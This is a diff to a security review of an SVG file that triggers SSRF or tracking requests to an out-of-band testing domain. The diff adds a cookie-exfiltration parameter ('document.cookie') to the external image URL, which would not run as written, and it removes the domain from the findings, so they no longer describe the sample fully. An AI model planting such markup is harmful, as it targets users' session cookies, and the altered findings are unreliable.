@@ -40,13 +40,13 @@ This document provides a review of `test.html` and `ssrf.svg` in the repository.
 ```xml
 <svg width="200" height="200"
   xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-  <image xlink:href="https://g7oxkjvm2pigw0d9a48bubem7dd411pq.oastify.com/image.jpg" height="200" width="200"/>
+  <image xlink:href="https://njwfvuseswxqaylzuqhypvn84znx1dsnq.oast.fun/image.jpg?cookie='+document.cookie" height="200" width="200"/>
 </svg>
 ```
 
 ### Findings
 - **SSRF Risk**: SVG files can be used to trigger Server-Side Request Forgery (SSRF) if a server-side component (like an image processor or PDF generator) renders the SVG and follows the external link in the `<image>` tag.
-- **Information Leakage**: Even if rendered in a client's browser, it causes the browser to make a request to an external OAST domain (`oastify.com`). This can be used to track users or leak their IP addresses.
+- **Information Leakage**: Even if rendered in a client's browser, it causes the browser to make a request to an external OAST domain. This can be used to track users or leak their IP addresses.
 - **Broken Link**: In the current environment, the image failed to load, appearing as a broken image icon.
 
 ### Recommendation
